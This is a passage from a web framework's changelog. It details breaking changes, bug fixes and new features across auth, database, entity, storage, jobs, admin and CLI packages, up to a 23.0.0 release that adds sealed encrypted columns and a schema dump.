  `consumeRecoveryCode(userId, codeHash)` are new. A custom adapter missing one does not compile.
- **BREAKING — `BuiltinAdapter` answers `X_AUTH_WRITE_FAILED` for an `x_users` unique violation**,
  was `X_DB_UNIQUE_VIOLATION`; `meta.column` is `email`, `external_id` or `id`.
- **BREAKING — `oauthLogin` requires `baseUrl` or `APP_URL`.** `X_ENV_MISSING` otherwise; the
  request's `Host` is never the fallback.
- **auth:** `disableUser` revokes the user's live API keys (the result gains `apiKeysRevoked`) and
  logs once, before the write.
- **auth:** `updatePrivileges` with a `passwordHash` ends every other session of that user — all
  of them when none of theirs is passed. The result gains `sessionsRevoked`.
- **auth:** `new BuiltinAdapter(client?, clock = systemClock)` stamps `x_verifications.consumed_at`
  from the clock.

Tier 5 — testing (slice 05).

- **BREAKING — `E2eSession.offline()` rejects when an attached page refuses the switch.**
  `X_CDP_CALL_FAILED` when a page that is still attached refuses the `navigator.onLine` script or
  its restore. It swallowed the refusal and stopped switching that page, so a test ran online
  while it believed otherwise. The restore is always attempted. Fix what the page refuses, or
  close the page before the call.
- **testing:** `X_CDP_TIMEOUT` says why a DevTools call went unanswered. `meta.reading` is
  `target-gone`, `lost-in-transport` or `no-answer`, with the frames that arrived since the call
  (`framesArrived`, `lastFrames`), the frames dropped as unparseable (`framesDropped` — they were
  dropped silently) and the navigations since. Code and title unchanged.

Tier 3 — query.

- **BREAKING — `compareValues` is removed, and `compareRows`, `matchesFilter` and `isAfterKey`
  require a `KindOf`.** Pass `kindsOf(shape.entity)`. Values compare by the column's declared kind
  in the live matcher, `from()` and the seek fallback, so a live query ordered on a `bigint()` or
  `decimal()` column patches rows where the database returns them. A relation no entity declares
  compares digits as text.
- **BREAKING — a declared `.limit()` is the size of the listing on every page.** `.page()` and
  `?_first=` no longer replace it, and a cursor cannot walk past it: the page after the last is
  empty with `nextCursor: null`. Drop the `.limit()` from a read meant to be paged to the end. A
  limited read's cursor carries the rows served so far, so a cursor minted before the upgrade on
  a limited read answers `X_CURSOR_INVALID` once.
- **query:** `./client` is 11,012 B minified for the browser, was 10,899; the cap is 11,264.
  `As of 2026-10-02`, as stated in the package's own notes — not re-measured here.

Tier 3 — query. Tier 4 — mcp.

- **BREAKING — a `single: true` read answers one row through its MCP tool**, or `X_NOT_FOUND` —
  from `tool().read()` and from the served `tools/call`. Its `outputSchema` is the row, was
  `{ rows }`. An agent or client that read `.rows[0]` reads the object. `tool().read()` is typed by
  the declaration: a list read still answers `readonly object[]`, and only a single read's type
  changed.

Tier 5 — admin.

- **BREAKING — importing `@ultimat3/admin` no longer declares `admin:*`.** The import used to
  close the app's permission set as a side effect; `defineAdmin()` declares them now, and the
  `adminPermissions` export is removed. An app with its own closed permission set that writes
  `can('admin:read')` before `defineAdmin()` runs adds `...ADMIN_PERMISSIONS` to its
  `definePermissions([...])`.

Tier 3 — action.

- **BREAKING — `mutator()` requires `idempotent: true`.** `MutatorDef.idempotent` is the required
  literal `true`: omitting it is a compile error, and `X_MUTATOR_NOT_IDEMPOTENT` at declaration
  for an untyped caller. Add `idempotent: true` to each `mutator({ … })`; `transition()` and
  `x g mutator` declare it. On more than one replica also
  `configureIdempotency({ scope: 'shared' })`.
- **BREAKING — the OpenAPI `Problem` schema changes, so every committed `openapi.json` is stale.**
  It adds `instance`, `requestId`, `issues` and `meta`, and drops the `^X_[A-Z0-9_]+$` pattern
  on `code`. Run `x manifest` and commit.
- **BREAKING — `x_idempotency` gains `tx_bound boolean not null default false`**, applied at boot
  by `add column if not exists`. An app's committed schema dump drifts: run `x db gen` and commit
  `packages/db/schema/`.
- **BREAKING — an idempotent action inside `withTransaction` settles with the commit**, on the
  memory and the Postgres store. A rollback leaves the record `in-flight`; it was `settled`. A
  transaction-bound in-flight record is reclaimable after the app's `requestTimeoutMs`, and a slow
  attempt whose key was taken fails `X_IDEMPOTENCY_RESERVATION_LOST` (409) and rolls back.
  Autocommit handlers are unchanged. A settle that outlives its transaction settles at once; a
  transaction opened on another database than the store's settles on the pool.
- **BREAKING — `postgresIdempotencyStore` takes two more required options**, `origin` and
  `reclaimAfterMs`:
  `postgresIdempotencyStore({ executor, origin: () => client, reclaimAfterMs: requestDeadlineMs })`.
  The framework's boot already passes them, with the app's configured request deadline.
- **BREAKING — `cache.invalidates` inside `withTransaction` fires at the root `COMMIT`**, never on
  rollback. `bustAfterCommit` returns `undefined` when the bust is deferred.
- **action:** `@ultimat3/action` now depends on `@ultimat3/db` — one file, `tx-scope.ts`; the edge
  is recorded in `docs/history/tier-decisions.md`.

Tier 5 — cli (slice 06).

- **BREAKING — the `manifest` step fails on a stale `openapi.json`.** `X_MANIFEST_STALE`; the step
  and `x manifest --check` are one check. `contract-diff` no longer reports staleness and is
  skipped when only `openapi.json` is committed. `x manifest --check` on an app with no
  `x.manifest.json` reports `X_MANIFEST_MISSING`, was `X_MANIFEST_DRIFT`.

Tier 5 — cli.

- **cli:** `X_VERIFY_STEP_TIMEOUT` names what was running. On expiry the step's test workers are
  killed first, so `bun test` itself reports the file each one held; the `cause` lists those
  files, `at` is the first, and the `fix:` runs that file alone. `meta` carries `step`,
  `deadlineMs`, `killed` (each process's `pid` and command line) and `inFlight` (per `bun test`
  run: `command`, `files`, `workers`, `stuck`). The step's output is what the killed runs last
  printed. Code and meaning unchanged.

### Fixed

Tier 0 — schema, core.

- **schema:** HTTP coercion tries every member of a union. `t.union(t.literal('auto'), t.number)`
  left `'12'` a string and failed validation; a union of objects coerced every value by its first
  branch. A string that some member accepts as a string is never converted: under
  `t.union(t.number, t.string)`, `'01234'` stays `'01234'`.
- **schema:** a thenable that is not a `Promise` instance — another realm's, a polyfill's — is
  refused as async (`X_SCHEMA_UNSUPPORTED`). It was read as a successful result with `value`
  undefined.
- **schema:** `SchemaError#toJSON()` no longer throws on a `bigint` or a cycle in `meta`.
- **core:** an OTLP endpoint with a query string joins the signal path on the path:
  `http://collector:4318?tenant=a` is `http://collector:4318/v1/traces?tenant=a`. A `NaN` or
  infinite attribute value is dropped instead of sent as `{"doubleValue":null}`, which cost the
  whole batch on a validating collector. An integer beyond 2^53 is sent as a double.
- **core:** images. A header declaring a zero, negative, fractional or `NaN` size is
  `X_IMAGE_DECODE_FAILED`, not `X_IMAGE_TOO_LARGE`. A PNG whose stream inflates past what its
  header's size needs is refused at that bound, and one over the pixel ceiling before a byte is
  inflated. A file whose only brand is `mif1` — a HEIC — is no longer sniffed as AVIF.
  `X_IMAGE_TOO_LARGE`'s `fix:` no longer names `MAX_IMAGE_PIXELS` as a setting.
- **core:** `nearestName` suggests nothing that shares nothing with the input. The cutoff scales
  with length: `nearestName('a', ['db', 'gen'])` answered `db`.
- **core:** `X_REGISTRAR_MISSING` and `X_REGISTRAR_CONFLICT` name the package that owns the kind.
  `bun add @ultimat3/task` named a package that does not exist; `task` and `job` are
  `@ultimat3/jobs`, `mutator` is `@ultimat3/action`, `route` is `@ultimat3/render`.
- **core:** `X_SECRETS_KEY_INVALID`'s `fix:` branches on where the key was read. Read from the key
  file, it names the file to edit; it used to re-read the bad file into the variable.

Tier 1 — i18n, time, db.

- **i18n:** `defineCatalogs` screens every locale tag before it registers any. `X_LOCALE_INVALID`
  used to arrive with the malformed tag and the other locales' strings already registered.
- **i18n:** a `q` in `Accept-Language` that is not a plain decimal (`q=abc`, `q=1e0`) is 0. It was
  left at 1, so a malformed range outranked every well-formed one.
- **time:** `addBusinessDays` keeps the original wall time across a DST day: 02:30 carried through
  a spring-forward Sunday landed at 03:30 on Monday. `businessDaysBetween` walks calendar dates,
  so it no longer counts past `to` across a date the zone skipped; a date the zone never had is
  not a day in either.
- **time:** a zone that is not a string — `undefined`, `null`, a number, an object — is
  `X_TIMEZONE_INVALID` from every public zoned function, and so is a formatter called with no
  options object. Each was a bare `TypeError`. `configureTime({ defaultZone: undefined })` no
  longer overwrites the zone in force.
- **db:** whether a five-character `code` is a SQLSTATE is decided by where the error came from,
  not its shape. A syscall error (`syscall`, or a numeric `errno`) such as `EPIPE` or `E2BIG` is
  `X_DB_UNAVAILABLE`; it was `X_DB_STATEMENT_FAILED`. A server error (it carries `severity`) with a
  letters-only state such as `ABCDE` is still `X_DB_STATEMENT_FAILED`. With neither marker a code
  counts only if it carries a digit.
- **db:** a ragged array or an Invalid Date parameter is `X_INVARIANT`, by one shape rule on
  Bun.SQL and PGlite alike; it was `X_DB_UNAVAILABLE`. A `Uint8Array` inside a bound array is one `bytea` element, not its bytes as
  separate elements.
- **db:** `refuseDependentViews` considers only tables visible on the search path.
- **db:** a `ROLLBACK TO SAVEPOINT` that fails marks the root aborted, so its `COMMIT` is refused
  rather than storing a scope its caller was told had rolled back.

Tier 1 — money, cache, seo, storage.

- **money:** `trimZeroFraction` keeps the fraction of a non-whole amount: 1250 USD is `$12.50`,
  was `$12.5`. It also applies beside `fractionDigits`, which used to override it.
- **money:** `fractionDigits` outside 0…100, a fraction or `NaN` is `X_MONEY_SCALE_INVALID`, and
  `allocate(m, parts)` over 1,000,000 parts is `X_ALLOCATION_INVALID`. Both were a bare
  `RangeError`.
- **cache:** `createCacheStack` deletes the key in a tier whose `set` refused; the tier went on
  answering with the value the fill superseded.
- **cache:** `estimateBytes` walks a `Map` and a `Set`. Each measured 2 bytes, so a byte-budgeted
  tier never evicted them.
- **seo:** `buildRobots({ disallow })` appends to every group and emits a `User-agent: *` group
  when none is declared. A crawler obeys only the group naming it, so a named group skipped the
  list.
- **seo:** `applyTitleTemplate` matches the brand as a whole word: `Ultimately fast` gets its
  brand suffix. `ogLocaleTag` is language and region only: `zh-hant-tw` is `zh_TW`, was
  `zh_Hant_TW`.
- **storage:** a retried `promoteAttachment` whose source is gone and whose destination exists
  returns the attached object, not `X_STORAGE_NOT_FOUND`.
- **storage:** local disk. A `put` or `copy` onto a key that is a path prefix of another is
  `X_STORAGE_KEY_CONFLICT`, was a bare `ENOTDIR` / `EISDIR`; its `fix:` names the disk as
  registered. A write commits through a pending marker, `.meta/<key>.json.pending`, so a crash
  leaves no torn bytes/sidecar pair; a pair in doubt answers `application/octet-stream` with the
  bytes' own etag. A marker that cannot be cleared after the three renames is not a failed `put`:
  the write succeeded, and readers re-check.
- **storage:** on the local disk, `stat()`, each `list()` entry and a `copy()`'s measurement of its
  source wait for an in-flight write of the same key, as `get()` does. In-process only.
- **storage:** coded I/O on the local disk and `s3`. A refused write is `X_STORAGE_PUT_FAILED`, a
  refused read `X_STORAGE_READ_FAILED`; they were bare filesystem errors and `S3Error`. A
  non-string key is `X_STORAGE_PATH_UNSAFE`; a non-bytes body, wrong-typed `put` options and a
  non-string `list` prefix or cursor are `X_INVARIANT`.
- **storage:** `isWithinOrg` never throws. An empty org is inside no org: a read under it is
  `X_STORAGE_ORG_MISMATCH` (404), was `X_STORAGE_PATH_UNSAFE` (400).
- **storage:** `uploadPolicy()` normalises `allowedContentTypes` — `audio/x-m4a` is `audio/mp4`,
  `video/x-m4v` is `video/mp4` — so an allowlist spelling an alias matches. The bad-grant-TTL
  `fix:` names `grantUpload`.

Tier 2 — http. Tier 4 — render. Tier 5 — cli.

- **render:** an ISR document with `revalidate.tags` carries `Surrogate-Key` and `Cache-Tag`. No
  shipped response carried a purge key before, so a CDN purge matched nothing and the edge held
  the document for its whole `s-maxage`.
- **http:** `applyCacheHeaders` removes `surrogate-key` and `cache-tag` from a response it marks
  `private` or `no-store`.
- **render:** the client router empties its prefetch cache again when its own POST settles, landed
  or not. Router script +20 B raw.
- **cli:** `/media/<key>?w=` stores a variant only for a width `usableWidths(intrinsic,
  DEFAULT_WIDTHS)` mints. A default width wider than the source is served and not stored; a source
  wider than 8192 stores its 8192 variant, which was decoded on every request.
- **cli:** `GET /_storage/:disk/*key` omits `Last-Modified` when the disk reports no date.

Tier 1 — db (slice 04). Tier 2 — entity.

- **db:** every drift finding's `fix:` is one command a shell runs. `changed-column`,
  `missing-check`, `changed-foreign-key`, `unexpected-table`, `unexpected-object` and the
  `unknown-schema` refusal changed text — mostly `psql "$DATABASE_URL" -c '…'   # then x db
  migrate`. The `cause` of `changed-foreign-key` and `changed-primary-key` names the constraint
  the database holds. For a table outside `public` the command carries
  `set search_path = "<schema>";` ahead of its statement, inside the same `psql -c`;
  `unexpected-table` and every `unexpected-object` target are schema-qualified. An unexpected
  domain says `domain` and is inspected with `\dD+`; an enum stays `\dT+`. The function lookup
  matches on the schema, not on visibility. The internal `rebuildForeignKey` is deleted; it was
  never on the index.
- **entity:** the page-size and asserted-rows refusals' `fix:` is a runnable
  `x entities describe <entity> --json`, with the code to write in the cause.
- **entity:** `transition(column, id, move)` with an `undefined` or `null` id is `X_NOT_FOUND` and
  moves no row. On Postgres it moved every row in the `from` state.
- **entity:** on Postgres, `update` / `updateWhere` on an entity with an app-only invariant run
  inside a transaction — a `SAVEPOINT` inside an open one — so a write the invariant refuses is
  rolled back. It used to stay written.
- **entity:** `c.col.trimmed()` strips U+0020 only in the app, as `btrim(col)` always did in the
  CHECK; the app approved a row with a tab or a newline that the CHECK refused as a raw `23514`.
  To refuse an all-whitespace value: `matches(/[^ \t\n\r\f\v]/)` — not `matches(/\S/)`, which is
  refused at declaration.
- **entity:** `atLeast` and `eq(<number>)` compare by the column's declared kind. A `bigint()` or
  `decimal()` row is judged by its digits, was always refused; `eq(5n)` matches an `integer()` 5;
  `eq('1.5')` on a decimal matches `'1.50'`. A `NaN` or infinite operand is refused at declaration.
- **entity:** `bigint()` refuses a value outside int8, as Postgres does (`22003`).
  `decimal({ precision: p, scale: p })` accepts a value below one.
- **entity:** `url()` refuses leading whitespace, a tab inside the scheme and `https:/host` — text
  the column's CHECK refused.
- **entity:** `memoryDriver()` enforces a unique declared as `invariant(name, c.unique([...]))`
  (`X_DB_UNIQUE_VIOLATION`, as Postgres). In `like`, `_` matches one code point, and a run of
  wildcards no longer backtracks without bound.
- **entity:** `has-key` with a non-string operand matches no row on both drivers; Postgres bound
  `String(value)` and found a key named `"null"`. `contains`, `contained-by` and `overlaps` on an
  array column never match a NULL element in memory, as on Postgres.
- **entity:** a bad table name is refused as one, with the repair at
  `entity(name, { table: '…' })`; it was called "not a physical column name".
- **entity:** a plaintext shaped like a sealed value is judged by the column's own bound
  (`text({ max })`) before it is sealed.
- **entity:** `X_AGGREGATE_MIXED_CURRENCY` tells one currency at two scales ("N scales of USD")
  from a mix of currencies; each has its own `fix:`.

Tier 2 — http (slice 04). Tier 4 — render. Tier 5 — testing, cli.

- **http:** a 5xx problem document whose cause is withheld carries the error's `callerFix`, else
  `x errors explain <CODE> --json`. It carried the developer `fix:`, which a driver writes from
  the statement, row or path it failed on.
- **http:** `requestTimeoutMs` above 2,147,483,647 is `X_CONFIG_INVALID`, and an
  `x-request-timeout-ms` above it is ignored. A timer cannot hold more; both armed about 1 ms and
  timed every request out at once.
- **http, render:** a redirect to a target that is not `http:` or `https:`, answered to a
  client-router request, hands over the requested URL's path. The client router likewise never
  navigates to a handed-over location that is not http(s). Router script +178 B raw.
- **http:** the locale-prefix redirect stays on this origin whatever follows the prefix;
  `/<locale>//host/x` produced a scheme-relative `Location`.
- **http:** two `Set-Cookie` headers set in one request both reach the wire; only the last did.
- **http:** a handler that outlives its 504 stays in the in-flight count until it settles, so a
  drain no longer closes the pool under it.
- **testing:** `launchChrome` has its own launch deadline — `max(timeoutMs, LAUNCH_TIMEOUT_MS)`, or
  `launchTimeoutMs` — and starts at most `LAUNCH_ATTEMPTS` times, the second only after the first
  process is killed, awaited, its process group reaped and its profile removed.
  `X_CDP_LAUNCH_FAILED` carries each attempt's reason, exit code and stderr tail in `cause` and
  `meta.attempts`; code and title unchanged. This is the cold-runner CI flake.
- **testing:** Chrome is spawned in its own process group and the group is reaped on close. Child
  processes outlived the browser and re-created the profile directory — 6–12 of 30 closes leaked
  one, as measured by the fix's author.
- **cli:** `x shot`'s session end waits for the browser to be reaped.

Tier 2 — auth (slice 05).

- **auth:** an OAuth user with MFA could not finish signing in; the OAuth path now ends in the
  same challenge as `login()`. A proven password with a factor still owed no longer clears the
  account's lockout bucket.
- **auth:** recovery-code redemption is one statement (`consumeRecoveryCode`).
- **auth:** OAuth route failure bodies carry one fixed `cause` and
  `fix: x errors explain <CODE> --json`. The authored cause and fix are the `auth.oauth.refused`
  log line.
- **auth:** `discoverOAuthProvider` refuses a document whose `issuer` differs from the one asked
  for, trailing slashes aside.
- **auth:** a JWKS answer with no importable key is `X_OAUTH_EXCHANGE_FAILED` (stage `jwks`) and
  leaves the cached keys. Provider detail in a cause is cut at 200 characters, and a cause no
  longer states the length of `SESSION_SECRET`.
- **auth:** `X_ACCOUNT_LOCKED` for a tenant bucket names no key; its `fix:` names
  `auth.orgLimiter.recordSuccess(orgKey(user.orgId))`.
- **auth:** `MemoryAdapter.updateUser` refuses an `externalId` another user holds, and
  `createUser` refuses an existing `id`, as the Postgres adapter does.

Tier 5 — testing (slice 05). Reference app.

- **testing:** the e2e app is never spawned on a port Chromium refuses (`net::ERR_UNSAFE_PORT`).
- **examples/dummy:** the `network` fixture's browser restore is awaited in teardown; the next
  test's page read `navigator.onLine === false` in 9 of 15 runs, as measured by the fix's author.
  The stale-build e2e awaits the update banner as an event, not a 5 s budget.

Tier 2 — entity. Tier 3 — query (slice 06).

- **entity:** one comparison rule, `numericOrder`, agreeing with Postgres 17. In the memory driver
  `where` and `order` compare decimal kinds by value: `where({ total: 10 })` on a `bigint()`
  column, `'2.5'` against a stored `'2.50'`, and `'-0.00'` against `'0'` now match. `uuid`
  operands order case-insensitively, and a `number` / `bigint` pair compares numerically.
  Invariants and the driver no longer disagree on an operand written `1e21`.
- **query:** `search()` refusals are `X_INPUT_INVALID` (400), were `X_INVARIANT` (500): a blank
  `q`, a cursor, a window that would cut rows.
- **query:** the typed read client sends a `Date` input as its ISO instant. A required array input
  the request omits reads `[]` instead of a 400, so `{ tags: [] }` arrives.

Tier 3 — action (slice 06).

- **action:** `transition()` is idempotent, and its `id` input schema comes from the entity's key
  (`output.id`): a uuid stays a uuid, `text()` keeps its length, `bigint()` its digits pattern. An
  optional `id:` overrides it. It was `t.uuid` for every entity, so the published input schema of
  a transition on a non-uuid key changes.
- **action:** `.contract()`'s OpenAPI assertion reads the registry-wide document. An unregistered
  `.named()` twin whose route another registered action owns fails `X_CONTRACT_DRIFT`.

## 23.0.0 - 2026-10-02

**23.0.0: platform readiness for big systems**
([`docs/plans/2026/10/01/101-platform-readiness-for-big-systems/`](docs/plans/2026/10/01/101-platform-readiness-for-big-systems/overview.md)).
Every breaking entry below has a manual edit in the
[Upgrading](https://github.com/developerz-ai/ultimate/wiki/Upgrading) `22.x → 23.0.0` section, in
the same order — which is the order an existing app meets them. There is no codemod and no
compatibility shim: a break is a build error or an `X_*` error that names the rewrite. `As of
2026-10` every slice of the plan has an entry, the admin's detail, form, action and jobs screens
included.

### Added

Seal and sealed columns.

- **core:** `seal()` / `open()` / `openText()` — one value sealed under the app's master key, the
  key `x secrets` already manages. AES-256-GCM, wire form `x1.<keyId>.<iv>.<ciphertext+tag>`
  (base64url); `purpose` is required and bound as authenticated data, so a value sealed for one
  column does not open as another. `{ deterministic: true }` for an equality lookup, `sealAll()`
  for one candidate per declared key, `isSealed()`, `sealedKeyId()`, `sealKeyIds()`,
  `resolveSealKeys()`. Three failures, three codes, all terminal and HTTP 500:
  `X_SEAL_KEY_MISSING`, `X_SEAL_KEY_UNKNOWN`, `X_SEAL_INVALID`.
- **core, cli:** a key ring. `ULTIMATE_SECRETS_RETIRED_KEYS` names the keys still allowed to open;
  `x secrets rotate --drop <keyId>` closes a rotation, `x secrets show` reports `retiredKeyIds`.
- **entity:** `text().sealed()` and `text().sealed({ lookup: true })`. Sealed on write, opened on
  read, purpose `entity:<table>.<column>`; the DDL stays `text`. The row type stays `string`;
  `entity.$schema` omits the column, so an action output or a record never carries it. On a
  repository row the property is own and **not enumerable**: `{ ...row }`, `JSON.stringify(row)`, a
  log line, a job payload, a cache entry and island props all drop it; read it by name. A `where` or
  `orderBy` on an opaque column is a compile error and `X_ENTITY_SEALED_PREDICATE`; a `$view` naming
  one is `X_ENTITY_SEALED_IN_VIEW`; a live query that filters or orders on one is
  `X_MATCHER_UNSUPPORTED` at subscribe. `{ lookup: true }` allows `eq`, `in`, NULL tests and
  `.unique()`. `andWhere(column, 'is-null' | 'is-not-null')` takes any column. An insert that
  spread a row and lost a required sealed column is `X_INVARIANT_VIOLATED` naming
  `{ ...row, <col>: row.<col> }`; a **nullable** one stores NULL, silently.
- **cli:** `x doctor` reports `X_SEAL_KEY_MISSING` when a sealed column exists and no key does, and
  `X_SEAL_RESEAL_PENDING` while a retired key is still declared. `x manifest diff` classes a column
  becoming sealed, unsealed, or moving lookup → opaque as breaking.
- **testing:** `toEqualRow(expected)` compares own properties, enumerable or not, and never prints a
  server-only value. The preload installs a fixed throwaway master key when `NODE_ENV=test` and the
  app has none.

The schema dump.

- **db, cli:** `packages/db/schema/` — the whole schema as generated SQL, one object per file in
  nine numbered directories, the framework's `x_` tables under `framework/`. Written by `x db gen`
  and `x db migrate`, by catalog introspection, byte-deterministic per engine major.
  `X_SCHEMA_DUMP_DRIFT` on the `drift` step for a missing, stale or hand-edited dump; the step also
  loads the dump back and compares it with the replay. Kinds the dump cannot render are named in
  `unrendered.sql`, never rendered wrong. `x db gen` / `x db migrate --json` gain
  `data.schemaDump`. `@ultimat3/db/schema-dump` is the subpath (`introspectCatalog`,
  `renderSchemaDump`, `loadSchemaDump`, `compareSchemaDump`).
- **db:** the scratch replay restores a post-`initdb` snapshot, `.x/cache/pglite-<version>-f1.snapshot`
  (about 40 MB; `rm -r .x/cache` is always safe). Measured on the reference app, one process per
  run, 2026-10-01: 3.9–4.6 s cold, 1.8–2.1 s warm.
- **db:** `client.listen(channel, handler)` on the Postgres and embedded clients, and `canListen`.

The typed client at scale.

- **core, render, cli:** the action path style is stamped once. A document served under a
  non-default `pathStyle` carries `<meta name="ultimate-path-style">`; `actionPath(name)` reads it
  when the caller names none, so `rpc`, `useMutation` and the outbox replay agree with the server
  without restating it. `CLIENT_PATH_STYLE_META`, `explainActionPathMiss`, `ServerHooks.explainMiss`.
- **cli:** `x new` writes `apps/web/shared/browser-client.ts` (`browserClient`, `browserQueries`)
  with its test, and `apps/web/api/index.ts` exports `type Api`.

Jobs.

- **jobs:** keyed concurrency — `concurrency: { key, limit, whenBusy: 'wait' | 'fail' }`. The key
  is derived from the input, held fleet-wide as a lease, at most 200 characters. `'fail'` settles
  the second run `failed` with `X_JOB_KEY_BUSY` (terminal), body never run, attempt uncounted.
- **jobs:** `finalAttempt` and `progress(…)` on the run arguments. Progress is written at most once
  a second and flushed before every settle.
- **jobs:** `onSettled(settled)` — one hook, told once per ending: `completed` (with the body's
  result), `dead-lettered`, `dropped`, `refused`. After the settle, by the worker whose settle
  landed, under the job's tenant; at most once across a crash; three tries, then
  `X_JOB_ON_SETTLED_FAILED`. Not called for a retry, a suspension, a drain or a cancel.
- **jobs, cli:** the operator surface on `JobIntrospection` — paged `list()` (`jobCursor`), `remove`,
  `requeueMany`, `removeMany`, `promote`, queue and task pause, a worker registry, per-job counters
  in 60 s / 300 s / 3,600 s tiers kept 24 h / 7 d / 30 d, `taskFires()`. CLI: `x jobs rm`,
  `x jobs promote`, `x jobs pause`, `x jobs resume`, `x jobs ls --after`; `x jobs show --json`
  carries `input` (redacted), `stack`, `progress`, `concurrencyKey`. New codes
  `X_JOB_NOT_REMOVABLE`, `X_JOB_NOT_PROMOTABLE` (409), `X_JOB_PAGE_INVALID` (400).
- **jobs, db, cli:** a cross-process wake. The `worker` role holds one `LISTEN` session; an enqueue
  and an outbox stage carry a throttled `pg_notify`. `startQueueWake`, `queue_wake_live` gauge.
- **jobs:** `EnqueueOptions.runId`; `resetEventBus()`.
- **jobs:** `JobIntrospection.promoteMany(filter)` and `PROMOTABLE_STATES` (`ready`, `delayed`) — run
  now over every matching row, bounded as `requeueMany`. `JobFilter.before` (the page before a
  cursor), `JobFilter.tenantId` and `BulkFilter.tenantId` (one org's rows). `nextTaskRun(task, from)`
  — a task's next occurrence in its own zone, the scheduler's own resolver. Both drivers, one
  parity fixture.

UI.

- **ui:** `respond-down`, `respond-between`, `rem()`, `fluid()` and a `stroke` scale
  (`hairline 1px`, `thick 2px`, `heavy 3px`) in `@ultimat3/ui/tokens`. `<Link appearance="button">`
  — a link with a button's look, one class function for both elements. `<Pagination hrefFor>` and
  `<DataTable hrefFor sortHrefFor>` — server-rendered paging and sorting as anchors, no island.
  `BarChart` draws a stacked second series (`ChartPoint.secondary`, `seriesLabels`).

Guards.

- **cli:** eight more shipped guards — `raw-length`, `raw-breakpoint`, `raw-z-index`, `raw-shadow`,
  `raw-motion`, `undefined-style-class`, `undeclared-custom-property`, `repo-raw-sql`. The list is
  `SHIPPED_GUARD_NAMES` in `packages/cli/src/templates/scaffold-guards.ts`. `x new` writes every
  one; `x g guard <name>` with a shipped guard's name writes that guard; `x doctor` lists the ones an
  app does not hold (`data.guards.missing`). Upgrading installs none. `guardSources(root)` is the
  run's one read of the app.

Generators.

- **cli:** `x g entity` registers the entity in the app's typed handle
  (`packages/db/src/client.ts`) and prints the next commands (`data.next` under `--json`). A handle
  it cannot edit is `X_DB_HANDLE_UNREGISTERED` with the two lines to add.
- **cli:** `x g entity` / `x g resource` write the admin's catalog keys (`admin.<table>.title`,
  `admin.<table>.field.<column>`) and grant `<table>:read|write|delete` to `admin`.
  `x g resource --admin` wires its override into `defineAdmin()`; `X_ADMIN_RESOURCE_UNWIRED` when
  there is no call to add to. A grant that could not be placed is an `X_PERMISSION_UNGRANTED`
  finding.
- **cli:** every generator emits unit tests that run the body it wrote — page (`renderRoute`),
  component (`renderView`), island states, job, task, backfill, live query, action handler. A
  default `x new` measures 100% of lines and functions; after all thirteen generators, 99.84% /
  99.39% (`--no-example`: 99.79% / 99.19%). Measured 2026-10-01.

Scraping.

- **scraping:** `egress: (input, ctx) => …` — an exit per session, resolved in the worker, winning
  over the driver's `proxy`. `cdpUrl` takes a `CdpResolver`: rent a browser per run, `release()`
  runs exactly once, `cost` is `Money`. `ScrapeReport.usage`. `eventPrompt({ timeout })` and
  `answerPrompt({ runId, index, answer })` — a mid-run question answered over the job event bus,
  the answer sealed on the bus. `ScrapeSecrets.conceal(value)`. `setScrapeClock` / `noWaitClock`.
  New codes `X_SCRAPE_EGRESS_UNSUPPORTED`, `X_SCRAPE_EGRESS_IN_PAYLOAD`.

Admin.

- **admin, render, cli:** `defineAdmin({ entities, db })` serves its own list, detail and form.
  Zero app script per document (`hydrate: 'never'`). `adminEntitiesOf(db)` makes every entity on
  the handle a screen. Mounted routes appear in `x routes` (`mount`) and the manifest.
- **admin:** list filters, scope tabs with counts, relation labels and a lookup screen, six column
  renderers, row scoping — all state in the URL (`?scope=`, `?sort=`, `?f.<field>.<op>=`).
  `X_ADMIN_FILTER_INVALID` for a parameter the resource does not derive. One list page is 4
  statements for 50 rows, 2 reference columns and 1 counted scope. `adminTestCtx()`.
- **admin:** the detail page and the forms — `sections` and `formGroups` (`{ titleKey, fields }`;
  an undeclared field lands in a default section drawn last), `related: ['<hasMany>']` drawn as
  the related resource's own list filtered to the row, `fields.<f>.hintKey` and
  `fields.<f>.on: 'create' | 'update'` (enforced on the write too). A detail page with 2 related
  lists and a history card is 4 statements on the memory audit log, 5 on Postgres.
- **admin:** actions — `input` (the action's own form at `<row>?action=<name>`, 422 per field),
  `when(row)` (decides the button, asked again on the server: `X_ADMIN_ACTION_NOT_APPLICABLE`,
  409), `batch: true | { threshold, chunk? }` (checked rows or every row the list's URL matches —
  200 inline per request, up to 1,000 queued as `admin.batch` jobs a worker runs as the operator;
  `X_ADMIN_MOUNT_MISSING` when a worker never ran `defineAdmin`), and `matching` (one set-based
  call for "all matching"). No island: native forms, zero admin JavaScript.
- **admin:** a durable audit log — `postgresAuditLog()` over `x_admin_audit`, applied at boot from
  `@ultimat3/admin/schema`, one insert per audited write inside the write's own transaction;
  allowed reads only with `reads: true`; sealed and sensitive values `[redacted]`. The detail page
  carries the row's history.
- **admin:** the jobs dashboard in every `defineAdmin()` — `/admin/jobs` (tiles, done vs failed over
  1h / 24h / 7d / 30d, per-name volume, failure rate and mean duration, a declared 30 s refresh),
  `/admin/jobs/runs`, `/queues`, `/tasks`, `/workers`: four ordinary resources over
  `JobIntrospection` with retry, retry from a step, run now, cancel, remove, queue and task pause /
  resume, task run now. `job:read` reads, `job:manage` acts; an actor with an `orgId` sees only that
  org's runs and none of the fleet. `AdminResourceOptions.permission` (the noun a resource's
  permissions are named after), `AdminAction.matching`, `JOB_READ`, `JOB_MANAGE`, `jobRowScope`.
  The `/_x` jobs tab draws the same overview. Statements: 1 for a runs list, 5 for a run's detail.
- **examples/dummy:** a run console — a `scrape()` job per connection with a live event feed, a
  prompt answered mid-run, a refused second run said in words, what an ended run used, `/v1` bearer
  access and the MCP projection — and its operator view as `defineAdmin()` resources and a
  `run.cancel` action with `when` and `batch`, no page of its own.

Runtime.

- **core, db, cli:** process metrics on the scrape endpoint — `process_resident_memory_bytes`,
  `process_heap_used_bytes`, `process_heap_total_bytes`, `process_external_memory_bytes`,
  `process_cpu_seconds_total`, `process_event_loop_lag_seconds`, `process_start_time_seconds`,
  `process_info{role}`, `db_pool_max`, `db_pool_in_use`, `db_pool_waiting`.
- **cli:** `x build --target prebuilt` — writes the island store and compiled stylesheets to
  `node_modules/.cache/ultimate`, for the image build to run. No gate, no subprocess.

Test kit.

- **testing:** `renderView`, `renderRoute`, `memoryLocalTx`, `authRequest`, `describeIslandState`,
  `mountIslandState`; `unitTest` / `contractTest` / `liveTest` / `jobTest` take the fixture bag and
  `{ timeoutMs }`; `runJobs(handle, input, { actor, tenantId })` and the body's result on the trace.
